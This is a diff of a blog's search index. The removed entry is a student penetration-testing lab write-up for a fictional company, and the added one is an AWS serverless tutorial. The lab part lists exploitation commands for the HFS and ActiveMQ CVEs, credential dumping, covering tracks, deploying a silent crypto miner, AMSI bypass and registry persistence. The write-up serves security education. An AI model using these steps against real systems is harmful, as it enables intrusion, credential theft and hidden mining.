@@ -1,559 +1,173 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>Ethical Hacking Assignment | SME Network Penetration Testing</title>
-    <url>/2025/01/28/Ethical-Hacking-Pentesting/</url>
-    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>During the COVID-19 pandemic, many organizations faced cybersecurity challenges as they quickly adapted to remote work environments. “<strong>Tech Skibidi Inc.</strong>“, a medium-sized IT support and software development company, encountered vulnerabilities due to rapid technology deployment and insufficient security measures. This project aims to assess and strengthen their security posture through penetration testing and real-world attack simulations.</p>
-<h2 id="Objectives"><a href="#Objectives" class="headerlink" title="Objectives"></a>Objectives</h2><ul>
-<li>Identify vulnerabilities within the office network.</li>
-<li>Simulate real-world cyberattacks to evaluate system resilience.</li>
-<li>Provide actionable recommendations to mitigate risks and improve security.</li>
-</ul>
-<h2 id="Use-Case-SME-Office-Network-Penetration-Testing"><a href="#Use-Case-SME-Office-Network-Penetration-Testing" class="headerlink" title="Use Case: SME Office Network Penetration Testing"></a>Use Case: SME Office Network Penetration Testing</h2><h3 id="Business-Overview"><a href="#Business-Overview" class="headerlink" title="Business Overview"></a>Business Overview</h3><p><strong>Tech Skibidi Inc.</strong> employs 50 staff members across its main office and remote locations. Their network includes desktops, laptops, smartphones, printers, routers, and switches, primarily relying on Windows servers with some Linux systems.</p>
-<h3 id="Penetration-Testing-Goals"><a href="#Penetration-Testing-Goals" class="headerlink" title="Penetration Testing Goals"></a>Penetration Testing Goals</h3><p>The project simulates attacks to uncover weaknesses and demonstrate their impact through:</p>
-<ul>
-<li>Network scanning and enumeration.</li>
-<li>Vulnerability assessment.</li>
-<li>Exploitation and post-exploitation activities.</li>
-</ul>
-<h2 id="Pen-Test-Environment-Setup"><a href="#Pen-Test-Environment-Setup" class="headerlink" title="Pen-Test Environment Setup"></a>Pen-Test Environment Setup</h2><h3 id="Network-Diagram"><a href="#Network-Diagram" class="headerlink" title="Network Diagram"></a>Network Diagram</h3><p>The network is divided into virtual machines for the attacker and target environments:</p>
-<ul>
-<li><strong>Attacking Machine</strong>: Kali&#x2F;Black Arch&#x2F;Parrot Linux.</li>
-<li><strong>Linux Server</strong>: Ubuntu 24.04 LTS.</li>
-<li><strong>Windows Server</strong>: 2019 with Active Directory.</li>
-</ul>
-<h3 id="Virtual-Network-Interfaces-Configuration"><a href="#Virtual-Network-Interfaces-Configuration" class="headerlink" title="Virtual Network Interfaces Configuration"></a>Virtual Network Interfaces Configuration</h3><ul>
-<li><strong>VMnet1</strong>: Host-only (192.168.1.0&#x2F;24)</li>
-<li><strong>VMnet2</strong>: Host-only (192.168.2.0&#x2F;24)</li>
-<li><strong>VMnet3</strong>: Host-only (192.168.3.0&#x2F;24)</li>
-</ul>
-<p>Each device is assigned a unique IP address and configured to ensure isolation and security.</p>
-<hr>
-<h2 id="Tasks-and-Highlights"><a href="#Tasks-and-Highlights" class="headerlink" title="Tasks and Highlights"></a>Tasks and Highlights</h2><h3 id="Task-1-Network-Scanning-and-Enumeration"><a href="#Task-1-Network-Scanning-and-Enumeration" class="headerlink" title="Task 1: Network Scanning and Enumeration"></a>Task 1: Network Scanning and Enumeration</h3><ul>
-<li>Tools used: <strong>Nmap</strong> to identify live hosts, open ports, and services.</li>
-<li>Results: Enumeration revealed several exploitable vulnerabilities.</li>
-</ul>
-<h3 id="Task-2-Vulnerability-Assessment"><a href="#Task-2-Vulnerability-Assessment" class="headerlink" title="Task 2: Vulnerability Assessment"></a>Task 2: Vulnerability Assessment</h3><ul>
-<li>Tools used: <strong>OpenVAS</strong> and <strong>Nessus</strong> to detect vulnerabilities.</li>
-<li>Findings: Key exploits include <strong>CVE-2024-39943</strong> (HFS) and <strong>CVE-2023-46604</strong> (ActiveMQ).</li>
-</ul>
-<hr>
-<h2 id="Exploitation-Step-by-Step-Process"><a href="#Exploitation-Step-by-Step-Process" class="headerlink" title="Exploitation: Step-by-Step Process"></a>Exploitation: Step-by-Step Process</h2><h3 id="Exploitation-1-Rejetto-HFS-Vulnerability-CVE-2024-39943"><a href="#Exploitation-1-Rejetto-HFS-Vulnerability-CVE-2024-39943" class="headerlink" title="Exploitation 1: Rejetto HFS Vulnerability (CVE-2024-39943)"></a>Exploitation 1: Rejetto HFS Vulnerability (CVE-2024-39943)</h3><h4 id="Step-1-Scan-the-Target"><a href="#Step-1-Scan-the-Target" class="headerlink" title="Step 1: Scan the Target"></a>Step 1: Scan the Target</h4><ol>
-<li><p>Run <code>nmap</code> to identify open ports on the target Ubuntu server:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap 192.168.1.129</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Confirm port 443 is open for HTTP File Server.</p>
-</li>
-</ol>
-<h4 id="Step-2-Login-to-the-HFS-Web-Interface"><a href="#Step-2-Login-to-the-HFS-Web-Interface" class="headerlink" title="Step 2: Login to the HFS Web Interface"></a>Step 2: Login to the HFS Web Interface</h4><ol>
-<li>Access the target HFS server at:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&lt;Ubuntu IP&gt;:443/</span><br></pre></td></tr></table></figure></li>
-<li>Login using default credentials:<ul>
-<li><strong>Username</strong>: <code>guest</code></li>
-<li><strong>Password</strong>: <code>guest</code></li>
-</ul>
-</li>
-</ol>
-<h4 id="Step-3-Capture-Session-Cookies"><a href="#Step-3-Capture-Session-Cookies" class="headerlink" title="Step 3: Capture Session Cookies"></a>Step 3: Capture Session Cookies</h4><ol>
-<li>Open the browser’s <strong>Network Inspector</strong> and refresh the page.</li>
-<li>Copy the session cookies from the <strong>GET</strong> request headers.</li>
-</ol>
-<h4 id="Step-4-Exploit-the-Vulnerability"><a href="#Step-4-Exploit-the-Vulnerability" class="headerlink" title="Step 4: Exploit the Vulnerability"></a>Step 4: Exploit the Vulnerability</h4><ol>
-<li>Prepare a listening terminal on the attacker machine:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netcat -lvp 4444</span><br></pre></td></tr></table></figure></li>
-<li>Use the <code>hfs_vuln_script.py</code> to exploit the server:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python ./hfs_vuln_script.py</span><br></pre></td></tr></table></figure></li>
-<li>Provide the following details in the script:<ul>
-<li><strong>URL</strong>: Target HFS server URL.</li>
-<li><strong>Cookies</strong>: Captured session cookies.</li>
-<li><strong>Attacker IP</strong>: Local IP of the attacking machine.</li>
-<li><strong>Port</strong>: Listening port (e.g., 4444).</li>
-</ul>
-</li>
-</ol>
-<h4 id="Step-5-Verify-Exploitation"><a href="#Step-5-Verify-Exploitation" class="headerlink" title="Step 5: Verify Exploitation"></a>Step 5: Verify Exploitation</h4><ul>
-<li>Check the terminal for root access to the Ubuntu server.</li>
-</ul>
-<hr>
-<h3 id="Exploitation-2-ActiveMQ-Hello-Kitty-Vulnerability-CVE-2023-46604"><a href="#Exploitation-2-ActiveMQ-Hello-Kitty-Vulnerability-CVE-2023-46604" class="headerlink" title="Exploitation 2: ActiveMQ Hello Kitty Vulnerability (CVE-2023-46604)"></a>Exploitation 2: ActiveMQ Hello Kitty Vulnerability (CVE-2023-46604)</h3><h4 id="Step-1-Setup-the-Target"><a href="#Step-1-Setup-the-Target" class="headerlink" title="Step 1: Setup the Target"></a>Step 1: Setup the Target</h4><ol>
-<li>Install <strong>ActiveMQ Server</strong> on Windows Server 2019 (version 5.18.2).</li>
-<li>Start the server by running the <code>.bat</code> file.</li>
-</ol>
-<h4 id="Step-2-Prepare-the-Exploit"><a href="#Step-2-Prepare-the-Exploit" class="headerlink" title="Step 2: Prepare the Exploit"></a>Step 2: Prepare the Exploit</h4><ol>
-<li>On the Kali machine, download the exploit source code for CVE-2023-46604.</li>
-<li>Copy the payload to the Metasploit framework’s <code>misc</code> folder.</li>
-</ol>
-<h4 id="Step-3-Configure-Metasploit"><a href="#Step-3-Configure-Metasploit" class="headerlink" title="Step 3: Configure Metasploit"></a>Step 3: Configure Metasploit</h4><ol>
-<li>Launch Metasploit:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></li>
-<li>Reload all modules to include the new payload:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reload_all</span><br></pre></td></tr></table></figure></li>
-<li>Search for the CVE payload:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search cve-2023-46604</span><br></pre></td></tr></table></figure></li>
-<li>Select the payload and set required options:<ul>
-<li><strong>RHOST</strong>: Target IP address.</li>
-<li><strong>LHOST</strong>: Attacker IP address.</li>
-<li><strong>SRVPORT</strong>: Local listening port.</li>
-<li><strong>FETCH_SRVPORT</strong>: Exploit port (different from SRVPORT).</li>
-</ul>
-</li>
-</ol>
-<h4 id="Step-4-Execute-the-Exploit"><a href="#Step-4-Execute-the-Exploit" class="headerlink" title="Step 4: Execute the Exploit"></a>Step 4: Execute the Exploit</h4><ol>
-<li>Launch the attack:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure></li>
-<li>Start a Meterpreter session with the victim machine.</li>
-</ol>
-<hr>
-<h3 id="Task-4-Post-Exploitation-Activities"><a href="#Task-4-Post-Exploitation-Activities" class="headerlink" title="Task 4: Post-Exploitation Activities"></a>Task 4: Post-Exploitation Activities</h3><h4 id="1-Data-Exfiltration"><a href="#1-Data-Exfiltration" class="headerlink" title="1. Data Exfiltration"></a>1. Data Exfiltration</h4><ol>
-<li>Use <strong>Meterpreter (Kiwi)</strong> to dump credentials:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure></li>
-<li>Save the credentials to a text file:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">download C:\\Users\\Public\\passwords.txt /home/kali/passwords.txt</span><br></pre></td></tr></table></figure></li>
-<li>Clear tracks by deleting the text file from the victim machine:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> C:\\Users\\Public\\passwords.txt</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h4 id="2-Silent-Cryptocurrency-Mining"><a href="#2-Silent-Cryptocurrency-Mining" class="headerlink" title="2. Silent Cryptocurrency Mining"></a>2. Silent Cryptocurrency Mining</h4><ol>
-<li>Upload the <strong>Silent-XMRig-Miner</strong> to the victim machine:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upload /home/kali/Downloads/SilentMiner.zip C:\\Desktop</span><br></pre></td></tr></table></figure></li>
-<li>Execute the miner silently:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Start-Process -FilePath <span class="string">&quot;C:\\Desktop\\SilentMiner\\xmrig.exe&quot;</span> -Verb RunAs</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h4 id="3-Sliver-C2-Framework"><a href="#3-Sliver-C2-Framework" class="headerlink" title="3. Sliver C2 Framework"></a>3. Sliver C2 Framework</h4><ol>
-<li>Inject processes and bypass AMSI:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">inject-etw-bypass &lt;pid&gt;</span><br><span class="line">inject-asmi-bypass &lt;pid&gt;</span><br></pre></td></tr></table></figure></li>
-<li>Create persistence:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">registry write -T binary --path /tmp/GREEN_OVERSHOOT.exe --hive HKCU <span class="string">&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span> updater</span><br></pre></td></tr></table></figure></li>
-<li>Capture screenshots:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screenshot</span><br></pre></td></tr></table></figure></li>
-</ol>
-<hr>
-<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>The penetration testing project successfully demonstrated the exploitation of critical vulnerabilities in <strong>Tech Skibidi Inc.’s</strong> network, including:</p>
-<ul>
-<li>Remote code execution (CVE-2024-39943).</li>
-<li>Privilege escalation and data exfiltration (CVE-2023-46604).</li>
-<li>Covert cryptocurrency mining and persistent access.</li>
-</ul>
-<h3 id="Recommendations"><a href="#Recommendations" class="headerlink" title="Recommendations"></a>Recommendations</h3><ol>
-<li>Patch outdated software (HFS, ActiveMQ).</li>
-<li>Enhance monitoring for unauthorized processes and file changes.</li>
-<li>Implement robust access controls and endpoint detection.</li>
-</ol>
-<hr>
-<h2 id="Citations"><a href="#Citations" class="headerlink" title="Citations"></a>Citations</h2><ul>
-<li><a href="https://github.com/BishopFox/sliver">Sliver C2 Documentation</a></li>
-<li><a href="https://github.com/truonghuuphuc/CVE-2024-39943-Poc">CVE-2024-39943 PoC</a></li>
-<li><a href="https://github.com/operationalguy/silent-XMRig-miner">Silent-XMRig-Miner</a></li>
-<li><a href="https://activemq.apache.org/components/classic/download/classic-05-18-02">ActiveMQ Vulnerability Details</a></li>
-</ul>
-<hr>
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>Build a Serverless Web App on AWS</title>
+      <link href="/2025/02/04/Build-a-Serverless-Web-App-on-AWS/"/>
+      <url>/2025/02/04/Build-a-Serverless-Web-App-on-AWS/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Serverless architecture eliminates the need for infrastructure management, allowing developers to focus on code rather than servers. In this guide, we will walk through the process of building a serverless web application using AWS services.</p><h2 id="What-is-Serverless-Architecture"><a href="#What-is-Serverless-Architecture" class="headerlink" title="What is Serverless Architecture?"></a>What is Serverless Architecture?</h2><p>Serverless architecture allows applications to run without provisioning or managing servers. AWS provides services like:</p><ul><li><strong>AWS Lambda</strong> for executing backend logic.</li><li><strong>Amazon API Gateway</strong> for handling HTTP requests.</li><li><strong>Amazon DynamoDB</strong> as a NoSQL database.</li><li><strong>Amazon S3</strong> for static website hosting.</li><li><strong>Amazon SNS</strong> for event-driven notifications.</li></ul><h2 id="Serverless-Application-Architecture-on-AWS"><a href="#Serverless-Application-Architecture-on-AWS" class="headerlink" title="Serverless Application Architecture on AWS"></a>Serverless Application Architecture on AWS</h2><h3 id="1-Hosting-a-Static-Web-Application"><a href="#1-Hosting-a-Static-Web-Application" class="headerlink" title="1. Hosting a Static Web Application"></a>1. <strong>Hosting a Static Web Application</strong></h3><p>We use <strong>Amazon S3</strong> to host a static website.</p><ol><li>Create an S3 bucket.</li><li>Enable static website hosting in bucket properties.</li><li>Upload the frontend files (HTML, CSS, JavaScript).</li><li>Set bucket permissions for public access.</li></ol><h3 id="2-Setting-Up-API-Gateway-and-Lambda"><a href="#2-Setting-Up-API-Gateway-and-Lambda" class="headerlink" title="2. Setting Up API Gateway and Lambda"></a>2. <strong>Setting Up API Gateway and Lambda</strong></h3><p>AWS API Gateway provides an interface for HTTP requests and routes them to AWS Lambda.</p><ol><li>Create an <strong>API Gateway</strong> with HTTP methods (GET, POST, etc.).</li><li>Configure <strong>Lambda functions</strong> to process API requests.<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">handler</span> = <span class="keyword">async</span> (<span class="params">event</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> body;</span><br><span class="line">    <span class="keyword">let</span> statusCode = <span class="string">&quot;200&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> headers = &#123;</span><br><span class="line">      <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Full event object:&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(event, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line">  </span><br><span class="line">      <span class="comment">// Extract HTTP method and validate it</span></span><br><span class="line">      <span class="keyword">const</span> method = event.<span class="property">requestContext</span>?.<span class="property">http</span>?.<span class="property">method</span> || event.<span class="property">httpMethod</span>;</span><br><span class="line">      <span class="keyword">if</span> (!method) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;HTTP method is missing in the event object.&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">let</span> tableName;</span><br><span class="line">      <span class="keyword">if</span> (method === <span class="string">&quot;POST&quot;</span> &amp;&amp; event.<span class="property">body</span>) &#123;</span><br><span class="line">        <span class="comment">// For POST, get TableName from the request body</span></span><br><span class="line">        <span class="keyword">const</span> requestBody = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(event.<span class="property">body</span>);</span><br><span class="line">        tableName = requestBody.<span class="property">TableName</span>;</span><br><span class="line">        <span class="keyword">if</span> (!tableName) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;TableName is required in the request body.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="comment">// For GET, get TableName from the query string</span></span><br><span class="line">        tableName = event.<span class="property">queryStringParameters</span>?.<span class="property">TableName</span>;</span><br><span class="line">        <span class="keyword">if</span> (!tableName) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;TableName is required in the query string.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">switch</span> (method) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;POST&quot;</span>: &#123;</span><br><span class="line">          <span class="comment">// Ensure required fields are present in the body for POST</span></span><br><span class="line">          <span class="keyword">const</span> requestBody = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(event.<span class="property">body</span>);</span><br><span class="line">          <span class="keyword">if</span> (!requestBody.<span class="property">Item</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Item is required in the request body.&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Step 1: Get the current `nextid` from the record with `id = -1`</span></span><br><span class="line">          <span class="keyword">const</span> getParams = &#123;</span><br><span class="line">            <span class="title class_">TableName</span>: tableName,</span><br><span class="line">            <span class="title class_">Key</span>: &#123; <span class="attr">id</span>: -<span class="number">1</span> &#125;, <span class="comment">// Assuming `id` is a number</span></span><br><span class="line">          &#125;;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">const</span> &#123; <span class="title class_">Item</span>: metadata &#125; = <span class="keyword">await</span> dynamo.<span class="title function_">get</span>(getParams);</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">if</span> (!metadata || !metadata.<span class="property">nextid</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Could not retrieve nextid from the metadata record (id = -1).&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">const</span> currentNextId = metadata.<span class="property">nextid</span>;</span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Step 2: Increment `nextid` for the new item</span></span><br><span class="line">          <span class="keyword">const</span> newId = currentNextId;</span><br><span class="line">          <span class="keyword">const</span> updatedNextId = currentNextId + <span class="number">1</span>;</span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Step 3: Update the `nextid` in the metadata record</span></span><br><span class="line">          <span class="keyword">const</span> updateParams = &#123;</span><br><span class="line">            <span class="title class_">TableName</span>: tableName,</span><br><span class="line">            <span class="title class_">Key</span>: &#123; <span class="attr">id</span>: -<span class="number">1</span> &#125;,</span><br><span class="line">            <span class="title class_">UpdateExpression</span>: <span class="string">&quot;SET nextid = :nextid&quot;</span>,</span><br><span class="line">            <span class="title class_">ExpressionAttributeValues</span>: &#123;</span><br><span class="line">              <span class="string">&quot;:nextid&quot;</span>: updatedNextId,</span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">await</span> dynamo.<span class="title function_">update</span>(updateParams);</span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Step 4: Insert the new item with the assigned `id`</span></span><br><span class="line">          <span class="keyword">const</span> newItem = &#123;</span><br><span class="line">            ...requestBody.<span class="property">Item</span>,</span><br><span class="line">            <span class="attr">id</span>: newId, <span class="comment">// Add the auto-incremented id</span></span><br><span class="line">          &#125;;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">const</span> putParams = &#123;</span><br><span class="line">            <span class="title class_">TableName</span>: tableName,</span><br><span class="line">            <span class="title class_">Item</span>: newItem,</span><br><span class="line">          &#125;;</span><br><span class="line">  </span><br><span class="line">          <span class="keyword">await</span> dynamo.<span class="title function_">put</span>(putParams);</span><br><span class="line">  </span><br><span class="line">          body = &#123; <span class="attr">message</span>: <span class="string">&quot;Item successfully created.&quot;</span>, newItem &#125;;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">          <span class="comment">// Handle GET requests</span></span><br><span class="line">          <span class="keyword">const</span> scanParams = &#123; <span class="title class_">TableName</span>: tableName &#125;;</span><br><span class="line">          <span class="keyword">const</span> scanResult = <span class="keyword">await</span> dynamo.<span class="title function_">scan</span>(scanParams);</span><br><span class="line">          body = scanResult;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">  </span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`Unsupported method &quot;<span class="subst">$&#123;method&#125;</span>&quot;`</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error occurred:&quot;</span>, err.<span class="property">message</span>);</span><br><span class="line">      statusCode = <span class="string">&quot;400&quot;</span>;</span><br><span class="line">      body = &#123; <span class="attr">error</span>: err.<span class="property">message</span> &#125;;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      body = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(body);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      statusCode,</span><br><span class="line">      body,</span><br><span class="line">      headers,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></li><li>Enable <strong>CORS</strong> in API Gateway to allow web access.</li><li>Deploy the API and obtain the endpoint URL.</li></ol><h3 id="3-Database-Integration-with-DynamoDB"><a href="#3-Database-Integration-with-DynamoDB" class="headerlink" title="3. Database Integration with DynamoDB"></a>3. <strong>Database Integration with DynamoDB</strong></h3><p>Amazon DynamoDB is used as a NoSQL database for storing customer data.</p><ol><li>Create a <strong>DynamoDB table</strong> with a partition key <code>id</code>.</li><li>Use AWS SDK in Lambda to interact with the database.</li><li>Implement API Gateway methods for GET and POST requests.</li></ol><h3 id="4-Implementing-a-Notification-System-with-SNS"><a href="#4-Implementing-a-Notification-System-with-SNS" class="headerlink" title="4. Implementing a Notification System with SNS"></a>4. <strong>Implementing a Notification System with SNS</strong></h3><p>AWS SNS allows sending notifications for database changes or file uploads.</p><ol><li>Create an SNS topic and subscribe an admin email.</li><li>Configure <strong>Lambda functions</strong> to trigger SNS notifications.</li><li>Set up <strong>S3 event notifications</strong> for file uploads.</li></ol><h2 id="Deployment-and-Testing"><a href="#Deployment-and-Testing" class="headerlink" title="Deployment and Testing"></a>Deployment and Testing</h2><h3 id="1-Testing-API-Gateway-and-Lambda"><a href="#1-Testing-API-Gateway-and-Lambda" class="headerlink" title="1. Testing API Gateway and Lambda"></a>1. <strong>Testing API Gateway and Lambda</strong></h3><ul><li>Use <strong>Postman</strong> or <code>curl</code> to send HTTP requests to the API Gateway endpoint.</li><li>Check <strong>CloudWatch logs</strong> for debugging Lambda execution.</li></ul><h3 id="2-Validating-DynamoDB-Data-Storage"><a href="#2-Validating-DynamoDB-Data-Storage" class="headerlink" title="2. Validating DynamoDB Data Storage"></a>2. <strong>Validating DynamoDB Data Storage</strong></h3><ul><li>Use AWS Console to inspect DynamoDB records.</li><li>Run queries using the AWS CLI.</li></ul><h3 id="3-Ensuring-Notification-System-Works"><a href="#3-Ensuring-Notification-System-Works" class="headerlink" title="3. Ensuring Notification System Works"></a>3. <strong>Ensuring Notification System Works</strong></h3><ul><li>Upload a file to the S3 bucket and verify the email notification.</li><li>Add a record to DynamoDB and check SNS messages.</li></ul><h2 id="AWS-Well-Architected-Framework-Considerations"><a href="#AWS-Well-Architected-Framework-Considerations" class="headerlink" title="AWS Well-Architected Framework Considerations"></a>AWS Well-Architected Framework Considerations</h2><h3 id="Security"><a href="#Security" class="headerlink" title="Security"></a><strong>Security</strong></h3><ul><li>Use <strong>IAM roles and policies</strong> for access control.</li><li>Encrypt data at rest and in transit.</li></ul><h3 id="Reliability"><a href="#Reliability" class="headerlink" title="Reliability"></a><strong>Reliability</strong></h3><ul><li>Enable <strong>DynamoDB auto-scaling</strong> to handle variable loads.</li><li>Use <strong>multi-AZ deployment</strong> for resilience.</li></ul><h3 id="Performance-Efficiency"><a href="#Performance-Efficiency" class="headerlink" title="Performance Efficiency"></a><strong>Performance Efficiency</strong></h3><ul><li>Optimize Lambda function execution time to minimize costs.</li><li>Use <strong>CloudFront</strong> for caching and faster content delivery.</li></ul><h3 id="Cost-Optimization"><a href="#Cost-Optimization" class="headerlink" title="Cost Optimization"></a><strong>Cost Optimization</strong></h3><ul><li>Configure <strong>S3 lifecycle policies</strong> for storage optimization.</li><li>Minimize Lambda execution time to reduce compute costs.</li></ul><h2 id="Video-of-Serverless-Web-Applications"><a href="#Video-of-Serverless-Web-Applications" class="headerlink" title="Video of Serverless Web Applications"></a>Video of Serverless Web Applications</h2><iframe src="https://www.youtube.com/embed/u8v-j1AqhlQ?si=JoZK_U_pBlIdf0fH" width="100%" height="415" frameborder="0" loading="lazy" allowfullscreen></iframe><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Serverless architecture on AWS simplifies application deployment, reduces infrastructure costs, and scales dynamically. By integrating <strong>Lambda, API Gateway, DynamoDB, S3, and SNS</strong>, you can build a fully functional web application with minimal infrastructure overhead.</p><hr><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://docs.aws.amazon.com/lambda/latest/dg/welcome.html">AWS Lambda Documentation</a></li><li><a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html">Amazon API Gateway Guide</a></li><li><a href="https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/Introduction.html">DynamoDB Introduction</a></li><li><a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/WebsiteHosting.html">Hosting Websites on S3</a></li></ul>]]></content>
+      
+      
       <categories>
